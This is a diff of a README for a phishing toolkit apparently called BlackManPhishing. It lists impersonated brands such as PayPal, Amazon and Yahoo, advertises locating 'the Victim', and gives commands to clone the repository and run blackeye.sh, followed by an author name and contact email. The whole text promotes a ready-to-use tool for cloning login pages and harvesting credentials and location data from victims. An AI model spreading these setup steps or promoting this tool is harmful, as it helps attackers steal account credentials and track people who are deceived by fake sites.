@@ -14,15 +14,19 @@ Added 10 new websites from the Pro version and add useriplocation !
 8. Paypal
 9. Amazon
 10. Yahoo
-11. 
 Now with this tool you will get the location of the Victim
 The tool is completely free now 
 ----------------------------------------------
+
+
+
 Usage:
 git clone https://github.com/thelinuxchoice/BlackManPhishing /BlackMan
 cd BlackMan
 bash blackeye.sh
 
+
+-------------------------------
+
 Author : Manash Mahanta 
 Contact Me : beastbattle24@gmail.com
-
